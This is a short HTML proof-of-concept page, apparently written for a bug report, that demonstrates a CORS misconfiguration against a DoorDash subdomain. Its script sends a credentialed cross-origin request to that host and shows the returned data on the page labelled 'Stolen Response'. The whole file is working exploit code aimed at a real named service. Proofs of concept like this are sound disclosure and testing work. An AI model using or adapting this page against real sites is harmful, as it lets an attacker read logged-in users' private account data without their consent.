<html>
 <body>
  <h2>CORS PoC by Deep Govind</h2>
  <div id="demo"></div>
  <script>
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://zgqup7.doordash.com", true);
    xhr.withCredentials = true;
    xhr.onreadystatechange = function() {
      if (xhr.readyState == 4) {
        document.getElementById("demo").innerHTML = "Stolen Response: " + xhr.responseText;
      }
    };
    xhr.send();
  </script>
 </body>
</html>
